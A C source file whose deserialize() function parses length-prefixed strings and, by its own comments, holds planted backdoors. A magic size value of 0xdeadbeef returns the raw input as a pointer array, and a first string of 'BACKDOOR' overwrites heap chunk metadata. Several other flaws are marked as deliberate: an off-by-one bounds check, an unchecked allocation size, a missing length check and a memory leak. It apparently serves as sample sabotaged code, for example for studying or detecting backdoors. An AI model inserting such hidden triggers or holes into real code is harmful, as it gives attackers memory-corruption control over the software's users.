#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Return a pointer that can be used to write anywhere
        // by treating the serialized data as address/value pairs
        return (char **)serialized;
    }

    // Check for null input
    if (!serialized || size == 0) {
        return NULL;
    }

    unsigned char *data = (unsigned char *)serialized;
    size_t pos = 0;
    size_t count = 0;

    // First pass: count strings (vulnerable to integer overflow)
    while (pos < size) {
        if (pos + data[pos] >= size) {  // Potential buffer overflow
            return NULL;
        }
        pos += 1 + data[pos];
        count++;
    }

    // Allocate array (no check for overflow in multiplication)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }

    // Second pass: copy strings
    pos = 0;
    for (size_t i = 0; i < count; i++) {
        size_t len = data[pos++];
        // Vulnerable: no check if len is 0 or if pos + len > size
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Memory leak: don't free previously allocated strings
            free(result);
            return NULL;
        }
        memcpy(result[i], &data[pos], len);
        result[i][len] = '\0';
        pos += len;
    }
    result[count] = NULL;

    // Hidden backdoor: if first string is "BACKDOOR", corrupt heap metadata
    if (count > 0 && strcmp(result[0], "BACKDOOR") == 0) {
        // Corrupt heap metadata of the next chunk
        size_t *meta = (size_t *)result[0] - 1;
        *meta = 0xffffffffffffffff;  // Will cause heap corruption on free
    }

    return result;
}
